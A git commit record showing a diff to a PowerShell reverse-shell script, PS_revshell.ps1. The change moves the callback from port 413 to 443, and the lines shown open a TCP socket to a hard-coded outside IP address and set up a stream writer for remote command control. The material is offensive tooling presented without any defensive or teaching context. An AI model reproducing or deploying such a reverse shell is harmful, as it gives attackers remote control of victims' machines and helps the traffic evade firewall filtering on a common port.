badbc2795af8a1214fb32c97789a148883a75a9e
b0k4nRb <stabelini.bruno@gmail.com>
2020-01-27 18:18:55 -0300

    Update PS_revshell.ps1

--- Powershell/PS_revshell.ps1
+++ Powershell/PS_revshell.ps1
@@ -1,4 +1,4 @@
-$socket = new-object System.Net.Sockets.TcpClient('198.211.113.157', 413);
+$socket = new-object System.Net.Sockets.TcpClient('198.211.113.157', 443);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
